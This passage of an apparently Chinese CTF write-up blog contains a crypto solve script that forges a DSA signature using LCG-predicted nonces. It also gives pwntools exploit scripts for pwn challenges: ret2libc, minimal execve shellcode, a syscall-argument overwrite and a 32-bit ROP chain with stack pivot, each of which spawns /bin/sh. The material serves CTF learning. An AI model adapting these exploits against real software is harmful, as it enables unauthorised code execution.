y<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'y = '</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'----------------------------------------------------'</span><span class="token punctuation">)</span>
<span class="token comment"># part 1</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
r_l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
ks_l<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'r = '</span><span class="token punctuation">)</span>
    r<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'r = '</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ks = '</span><span class="token punctuation">)</span>
    ks<span class="token operator">=</span><span class="token builtin">eval</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ks = '</span><span class="token punctuation">,</span>ks<span class="token punctuation">)</span>
    r_l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
    ks_l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ks<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>r_l<span class="token punctuation">,</span>ks_l<span class="token punctuation">)</span>

<span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">def</span> <span class="token function">recover_k</span><span class="token punctuation">(</span>residues<span class="token punctuation">)</span><span class="token punctuation">:</span>    
    <span class="token keyword">return</span> solve_crt<span class="token punctuation">(</span>residues<span class="token punctuation">,</span>small_primes<span class="token punctuation">)</span>

k_ <span class="token operator">=</span> <span class="token punctuation">[</span>recover_k<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> ks_l<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>k_<span class="token punctuation">)</span>

<span class="token comment">#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]</span>

R<span class="token punctuation">.</span><span class="token operator">&lt;</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>

f1<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
f2<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
f3<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>
f4<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span>
f5<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>
f6<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>
f7<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span>
f8<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span>
f9<span class="token operator">=</span>k_<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token operator">+</span>k_<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">*</span>c<span class="token operator">+</span>d<span class="token operator">-</span>k_<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span>

F<span class="token operator">=</span><span class="token punctuation">[</span>f1<span class="token punctuation">,</span>f2<span class="token punctuation">,</span>f3<span class="token punctuation">,</span>f4<span class="token punctuation">,</span>f5<span class="token punctuation">,</span>f6<span class="token punctuation">,</span>f7<span class="token punctuation">,</span>f8<span class="token punctuation">,</span>f9<span class="token punctuation">]</span>
ideal <span class="token operator">=</span> Ideal<span class="token punctuation">(</span>F<span class="token punctuation">)</span>

I <span class="token operator">=</span> ideal<span class="token punctuation">.</span>groebner_basis<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>I<span class="token punctuation">)</span>
n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>I<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n
b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n
c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n
d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">-</span>I<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>n

<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>b<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>d<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

lcg<span class="token operator">=</span>TripleLCG<span class="token punctuation">(</span>k_<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k_<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k_<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--------------------------------------------------'</span><span class="token punctuation">)</span>
<span class="token comment">#part 2</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' 2\n'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">307</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

r_l2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
s_l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span>

    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'r = '</span><span class="token punctuation">)</span>
    r<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'r = '</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b's = '</span><span class="token punctuation">)</span>
    s<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'s = '</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span>

    r_l2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span>
    s_l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r_l2<span class="token punctuation">,</span>s_l<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>r_l2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s_l<span class="token punctuation">)</span><span class="token punctuation">)</span>

m <span class="token operator">=</span> <span class="token string">b'a'</span>
h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'k='</span><span class="token punctuation">,</span>k<span class="token punctuation">)</span>
inv_r<span class="token operator">=</span>inverse<span class="token punctuation">(</span>r_l2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span>
x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s_l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>k<span class="token operator">%</span>q<span class="token operator">-</span>h<span class="token punctuation">)</span><span class="token operator">*</span>inv_r<span class="token punctuation">)</span> <span class="token operator">%</span> q
<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------------------------------------------"</span><span class="token punctuation">)</span>
<span class="token comment">#part 3</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'] '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>

end_m<span class="token operator">=</span><span class="token string">b'b'</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'e: '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>end_m<span class="token punctuation">)</span>

end_h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span><span class="token string">b'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_ <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">%</span>q
s_ <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>end_h<span class="token operator">+</span>x<span class="token operator">*</span>r_<span class="token punctuation">)</span><span class="token operator">*</span>inverse<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>q
<span class="token keyword">print</span><span class="token punctuation">(</span>r_<span class="token punctuation">,</span>s_<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'r: '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>r_<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b's: '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>s_<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p><img src="/images/1744633170180-60.png" alt="img" loading="lazy"></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>栈溢出，打ret2libc。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>

plt<span class="token operator">=</span><span class="token number">0x0401060</span>
got<span class="token operator">=</span><span class="token number">0x0404018</span>
rdi<span class="token operator">=</span><span class="token number">0x0401176</span>
start<span class="token operator">=</span><span class="token number">0x0401090</span>
ret<span class="token operator">=</span><span class="token number">0x040101a</span>

p<span class="token operator">=</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name."</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name."</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>Shellcode 限制0x12 大小，不能在mmap可执行区域二次写。</p>
<p>所有寄存器都被清空了，除了rdi为mmap可执行区域。</p>
<p>改eax成execve系统调用，之后再加rdi到写入&#x2F;bin&#x2F;sh的偏移，最后syscall去拿shell。</p>
<p>eax省2字节</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>

sc<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
mov eax, 0x3b
add rdi, 0xb
syscall
'''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b"/bin/sh"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>sc<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>第一次输入会在0x0404060处读0xa8 字节，第二次读有栈溢出，题目模拟了canary保护会跳到sub_4011B6。</p>
<p><img src="/images/1744633170177-2.png" alt="img" loading="lazy"></p>
<p>sub_4011B6会从qword_4040a0处拿rax， fd 拿rdi， buf拿rsi，count拿rdx。</p>
<p><img src="/images/1744633170177-3.png" alt="img" loading="lazy"></p>
<p>第一次写可以溢出到这些位置来改变syscall，伪造成execve(“&#x2F;bin&#x2F;sh”, 0, 0)。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">64</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0404108</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"say?"</span><span class="token punctuation">,</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>x86 静态编译，有栈溢出。</p>
<p><img src="/images/1744633170177-4.png" alt="img" loading="lazy"></p>
<p>返回之前可以栈迁移到任意地址，把栈迁移到第一次read再用第一次read写入rop即可。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>

eax<span class="token operator">=</span><span class="token number">0x080b470a</span>
ebx<span class="token operator">=</span><span class="token number">0x08049022</span>
ecx<span class="token operator">=</span><span class="token number">0x08049802</span>
edx<span class="token operator">=</span><span class="token number">0x08060bd1</span>

rop<span class="token operator">=</span>p32<span class="token punctuation">(</span>eax<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span>ebx<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80ef344</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span>ecx<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span>edx<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span>p32<span class="token punctuation">(</span><span class="token number">0x08049c6a</span><span class="token punctuation">)</span>
rop<span class="token operator">+=</span><span class="token string">b"/bin/sh\0"</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> rop<span class="token punctuation">)</span>

p<span class="token operator">=</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x080EF320</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"right?"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><p>Base64变种加密</p>
